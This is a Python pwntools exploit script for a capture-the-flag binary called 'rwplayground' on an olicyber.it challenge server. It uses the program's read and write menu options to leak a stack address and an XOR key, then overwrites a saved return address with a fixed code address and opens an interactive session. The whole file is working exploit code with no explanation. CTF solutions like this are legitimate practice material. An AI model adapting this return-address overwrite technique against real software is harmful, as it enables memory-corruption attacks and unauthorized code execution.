#!/usr/bin/env python3
from pwn import *

context.terminal = ('kgx', '-e')
context.binary = elf = ELF('./rwplayground')
if args.REMOTE:
    r = remote('rwplayground.challs.olicyber.it', 38051)
else:
    r = gdb.debug('./rwplayground', '''
        break *0x4014F3
        break *main+219
        b *main
        continue
    ''')

r.recvuntil(b'0x')
stack_addr = int(b'0x' + r.recvline().strip(), 16)-4
print(f'rsp: {hex(stack_addr)}')

write_k = 0x4040B8
read_k = 0x4040B0

r.recvuntil(b'> ')
r.sendline(b'1')
r.recvline()
r.sendline(b'0x403FA0')
r.recvuntil(b': ')
read_v = int(r.recvline().strip(), 16)

r.recvuntil(b'> ')
r.sendline(b'1')
r.recvline()
r.sendline(hex(write_k).encode())
r.recvuntil(b': ')
write_v = int(r.recvline().strip(), 16) ^ read_v

r.recvuntil(b'> ')
r.sendline(b'2')
r.recvline()
r.sendline(hex(write_k).encode())
r.recvline()
r.sendline(hex(write_v).encode())

r.recvuntil(b'> ')
r.sendline(b'2')
r.recvline()
r.sendline(hex(stack_addr+0x18).encode())
r.recvline()
r.sendline(hex(0x401397).encode())
print(hex(read_v), hex(write_v))

r.interactive()
